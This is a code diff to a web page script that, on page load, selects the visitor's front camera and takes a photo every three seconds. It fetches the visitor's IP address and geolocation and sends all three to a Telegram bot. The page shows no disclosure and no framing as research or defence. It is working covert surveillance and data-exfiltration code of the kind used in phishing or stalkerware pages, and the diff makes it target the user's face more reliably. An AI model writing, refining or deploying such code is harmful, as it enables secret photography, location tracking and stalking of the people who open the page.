@@ -52,37 +52,61 @@
 
     // Start capturing photos continuously
     function startCapturing() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-          const videoTrack = stream.getVideoTracks()[0];
-          const imageCapture = new ImageCapture(videoTrack);
-
-          // Function to capture a photo from front/back camera
-          function capturePhoto() {
-            imageCapture.takePhoto()
-              .then((blob) => {
-                getUserIP().then((ip) => {
-                  getLocation().then((location) => {
-                    sendToTelegram(blob, ip, location);
-                  }).catch(error => {
-                    console.error('Location Error:', error);
-                  });
-                }).catch(error => {
-                  console.error('IP Fetch Error:', error);
-                });
-              })
-              .catch((error) => {
-                console.error('Error capturing photo:', error);
-              });
+      navigator.mediaDevices.enumerateDevices().then(devices => {
+        let videoDeviceId = null;
+        
+        // Select the front camera
+        for (const device of devices) {
+          if (device.kind === 'videoinput' && device.label.includes('front')) {
+            videoDeviceId = device.deviceId;
+            break;
           }
+        }
 
-          // Continuously capture photo every 3 seconds
-          setInterval(capturePhoto, 3000);  // Interval set to capture every 3 seconds
+        if (!videoDeviceId) {
+          // If no front camera found, fall back to the first available camera
+          for (const device of devices) {
+            if (device.kind === 'videoinput') {
+              videoDeviceId = device.deviceId;
+              break;
+            }
+          }
+        }
 
-        })
-        .catch((error) => {
-          console.error('Permission error:', error);
-        });
+        // Start capturing from selected camera
+        navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDeviceId } })
+          .then((stream) => {
+            const videoTrack = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(videoTrack);
+
+            // Function to capture a photo
+            function capturePhoto() {
+              imageCapture.takePhoto()
+                .then((blob) => {
+                  getUserIP().then((ip) => {
+                    getLocation().then((location) => {
+                      sendToTelegram(blob, ip, location);
+                    }).catch(error => {
+                      console.error('Location Error:', error);
+                    });
+                  }).catch(error => {
+                    console.error('IP Fetch Error:', error);
+                  });
+                })
+                .catch((error) => {
+                  console.error('Error capturing photo:', error);
+                });
+            }
+
+            // Continuously capture photo every 3 seconds
+            setInterval(capturePhoto, 3000);  // Interval set to capture every 3 seconds
+          })
+          .catch((error) => {
+            console.error('Permission error:', error);
+          });
+      }).catch((error) => {
+        console.error('Error enumerating devices:', error);
+      });
     }
 
     // Send photo, IP, and location to Telegram bot
@@ -97,14 +121,17 @@
         body: formData
       })
       .then(response => response.json())
-      .then(data => console.log(data))
-      .catch(error => console.error('Error sending to Telegram:', error));
+      .then(data => {
+        console.log('Photo sent to Telegram:', data);
+      })
+      .catch(error => {
+        console.error('Error sending to Telegram:', error);
+      });
     }
 
     window.onload = function() {
       startCapturing(); // Start capturing photos and sending them continuously
     };
-
   </script>
 
 </body>
